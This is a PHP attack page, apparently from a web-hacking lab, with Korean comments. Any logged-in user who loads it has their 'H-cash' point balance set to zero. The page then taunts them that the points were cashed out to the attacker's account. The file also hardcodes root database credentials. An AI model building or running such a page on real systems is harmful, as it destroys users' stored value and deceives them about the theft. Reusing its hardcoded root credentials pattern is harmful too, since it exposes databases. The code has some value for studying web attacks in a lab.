<?php
// 세션 시작
session_start();

// 데이터베이스 연결 정보
$host = 'localhost';  // 데이터베이스 호스트
$dbname = 'jjazztest';  // 데이터베이스 이름
$username = 'root';  // 사용자 이름
$password = 'grbhack';  // 사용자 비밀번호

// 데이터베이스 연결 설정
try {
    $pdo = new PDO("mysql:host=$host;dbname=$dbname;charset=utf8", $username, $password);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);  // 예외 처리 설정
} catch (PDOException $e) {
    die("데이터베이스 연결 실패: " . $e->getMessage());
}

// 로그인 상태 확인
if (!isset($_SESSION['user_id'])) {
    header("Location: login.php");
    exit();
}

$user_id = $_SESSION['user_id'];  // 현재 사용자 ID

// 데이터베이스에서 사용자의 이름과 보유 H캐시 금액 조회
try {
    // 사용자 ID에 해당하는 이름과 보유 H캐시 금액을 조회
    $stmt = $pdo->prepare("SELECT MEM_NAME, MEM_POINT FROM MEMBERS WHERE MEM_ID = ?");
    $stmt->execute([$user_id]);
    $user_data = $stmt->fetch(PDO::FETCH_ASSOC);  // 결과를 연관 배열로 가져오기

    if (!$user_data) {
        die("사용자 정보를 찾을 수 없습니다.");
    }

    $user_name = $user_data['MEM_NAME'];  // 사용자 이름
    $user_point = $user_data['MEM_POINT'];  // 사용자 H캐시

    // 공격자 계좌 정보 설정 (여기서 실제로는 사용되지 않음)
    $attacker_account = [
        'bank_name' => '공격자 은행',
        'account_number' => '1234567890'
    ];

    // 사용자의 모든 H캐시를 0으로 설정
    $stmt = $pdo->prepare("UPDATE MEMBERS SET MEM_POINT = 0 WHERE MEM_ID = ?");
    $stmt->execute([$user_id]);
    $attack_user_point = $stmt->fetch(PDO::FETCH_ASSOC);

} catch (PDOException $e) {
    die("오류 발생: " . $e->getMessage());
}
?>


<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <title>전환 완료</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f9f9f9;
            margin: 0;
            padding: 0;
        }
        .container {
            max-width: 600px;
            margin: 50px auto;
            background: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }
        .container h2 {
            color: #990000;
            text-align: center;
        }
        .message {
            margin-top: 20px;
            font-size: 18px;
            color: gray;
            text-align: center;
        }
        .home-button {
            display: block;
            width: 100%;
            padding: 10px;
            background-color: #003399;
            color: white;
            text-align: center;
            text-decoration: none;
            border-radius: 4px;
            margin-top: 20px;
            font-size: 16px;
        }
        .home-button:hover {
            background-color: #002266;
        }
    </style>
</head>
<body>
<div class="container">
    <h2>Thank You!</h2>
    <p class="message">
        <?php echo htmlspecialchars($user_name); ?>님의 <?php echo htmlspecialchars($user_point); ?> H캐시가 제 계좌로 현금 전환 완료되었습니다.<br>
        <br>
        잔여 H캐시: <strong>0원</strong><br>
        <br>
        정말 감사합니다.
    </p>
    <a href="/home.php" class="home-button">홈으로 돌아가기</a>
</div>
</body>
</html>
